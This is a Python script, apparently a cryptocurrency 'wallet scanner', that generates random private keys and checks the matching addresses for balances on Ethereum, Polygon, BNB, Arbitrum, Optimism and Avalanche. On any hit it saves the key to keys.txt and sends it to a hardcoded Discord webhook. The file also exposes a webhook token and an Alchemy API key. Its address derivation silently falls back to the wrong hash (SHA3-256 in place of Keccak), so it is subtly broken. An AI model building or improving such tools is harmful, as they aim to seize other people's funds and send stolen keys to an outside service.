import secrets
import requests
import time
import hashlib
import json
from ecdsa import SigningKey, SECP256k1
from concurrent.futures import ThreadPoolExecutor

RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

WEBHOOK_URL = "https://discord.com/api/webhooks/1370714262237876224/od1EsdVEJ869kBHZB7vqGqXjOM55pcaK9NbPf_J97AUY5GFnHrVsRVcO-qB0oXY_012a"

RPC_ENDPOINTS = {
    "ETH": "https://eth-mainnet.g.alchemy.com/v2/kXg5eHzREfbkY0c7uxkdGOIRnjxHqby-",
    "POLYGON": "https://polygon-rpc.com",
    "BNB": "https://bsc-dataseed.binance.org/",
    "ARBITRUM": "https://arb1.arbitrum.io/rpc",
    "OPTIMISM": "https://mainnet.optimism.io",
    "AVAX": "https://api.avax.network/ext/bc/C/rpc"
}

BANNER_LINES = [
    "███╗░░░███╗░██████╗██╗░░██╗██╗░░░░░██╗░░░██╗",
    "████╗░████║██╔════╝╚██╗██╔╝██║░░░░░██║░░░██║",
    "██╔████╔██║╚█████╗░░╚███╔╝░██║░░░░░╚██╗░██╔╝",
    "██║╚██╔╝██║░╚═══██╗░██╔██╗░██║░░░░░░╚████╔╝░",
    "██║░╚═╝░██║██████╔╝██╔╝╚██╗███████╗░░╚██╔╝░░",
    "╚═╝░░░░░╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░"
]

TERMINAL_WIDTH = 120
LEFT_COL_WIDTH = 70
RIGHT_COL_START = LEFT_COL_WIDTH + 2  # column where hits start

def print_banner():
    print(RED)
    for line in BANNER_LINES:
        print(line)
    print(RESET)

def generate_private_key():
    return secrets.token_hex(32)

def private_key_to_address(private_key_hex):
    private_key_bytes = bytes.fromhex(private_key_hex)
    sk = SigningKey.from_string(private_key_bytes, curve=SECP256k1)
    vk = sk.verifying_key
    pub_key = b'\x04' + vk.to_string()
    try:
        import sha3
        keccak_hash = sha3.keccak_256(pub_key).digest()
    except ImportError:
        keccak_hash = hashlib.sha3_256(pub_key).digest()
    return "0x" + keccak_hash[-20:].hex()

def check_balance(address, chain_rpc):
    chain, rpc_url = chain_rpc
    headers = {"Content-Type": "application/json"}
    data = {
        "jsonrpc": "2.0",
        "method": "eth_getBalance",
        "params": [address, "latest"],
        "id": 1
    }
    try:
        response = requests.post(rpc_url, headers=headers, data=json.dumps(data), timeout=10)
        result = response.json()
        wei = int(result.get("result", "0x0"), 16)
        return chain, wei / 10**18
    except Exception:
        return chain, 0

def send_to_discord(message):
    try:
        requests.post(WEBHOOK_URL, json={"content": message})
    except Exception as e:
        print(f"Failed to send Discord message: {e}")

def move_cursor(row, col):
    print(f"\033[{row};{col}H", end='')

def clear_screen():
    print("\033[2J", end='')  # clear screen
    print("\033[H", end='')   # move cursor home

def main():
    clear_screen()
    print_banner()
    banner_height = len(BANNER_LINES)
    left_line = banner_height + 1
    right_line = banner_height + 2

    found_wallets = []

    try:
        while True:
            for _ in range(10):
                priv_key = generate_private_key()
                address = private_key_to_address(priv_key)

                # Left side: scanning log
                move_cursor(left_line, 1)
                print(" " * (LEFT_COL_WIDTH - 1), end='')  # clear line
                print(f"Checking: {address[:40]}...", end='')
                left_line += 1
                if left_line > banner_height + 40:
                    left_line = banner_height + 1
                    # clear left column block
                    for clear_line in range(left_line, left_line + 40):
                        move_cursor(clear_line, 1)
                        print(" " * (LEFT_COL_WIDTH - 1))

                # Check balances concurrently
                with ThreadPoolExecutor(max_workers=len(RPC_ENDPOINTS)) as executor:
                    futures = [executor.submit(check_balance, address, item) for item in RPC_ENDPOINTS.items()]
                    results = {f.result()[0]: f.result()[1] for f in futures}

                found = False
                for bal in results.values():
                    if bal > 0:
                        found = True
                        break

                if found:
                    found_wallets.append({
                        "address": address,
                        "priv_key": priv_key,
                        "balances": results,
                    })

                    # Clear right side before redraw
                    for clear_line in range(banner_height + 1, banner_height + 50):
                        move_cursor(clear_line, RIGHT_COL_START)
                        print(" " * (TERMINAL_WIDTH - RIGHT_COL_START))

                    # Header for found wallets
                    move_cursor(banner_height + 1, RIGHT_COL_START)
                    print(f"{RED}=== BALANCE FOUND ==={RESET}")
                    line_num = banner_height + 2

                    # Show last 20 found wallets
                    for wallet in found_wallets[-20:]:
                        move_cursor(line_num, RIGHT_COL_START)
                        print(wallet["address"][:42])
                        line_num += 1
                        for chain, bal in wallet["balances"].items():
                            color = GREEN if bal > 0 else RED
                            move_cursor(line_num, RIGHT_COL_START)
                            print(f"  {chain}: {color}{bal:.6f}{RESET}")
                            line_num += 1
                        move_cursor(line_num, RIGHT_COL_START)
                        print(f"  PrivKey: 0x{wallet['priv_key'][:10]}...")
                        line_num += 2

                    with open("keys.txt", "a") as f:
                        f.write(f"{address} : 0x{priv_key}\n")

                    msg = f"💰 **Balance found!**\nAddress: `{address}`\n"
                    for chain, bal in results.items():
                        status = "🟢" if bal > 0 else "🔴"
                        msg += f"{status} {chain}: {bal:.6f}\n"
                    msg += f"Private Key: ||0x{priv_key}||"
                    send_to_discord(msg)

            time.sleep(1)

    except KeyboardInterrupt:
        move_cursor(banner_height + 51, 0)
        print("\nStopped by user.")

if __name__ == "__main__":
    main()
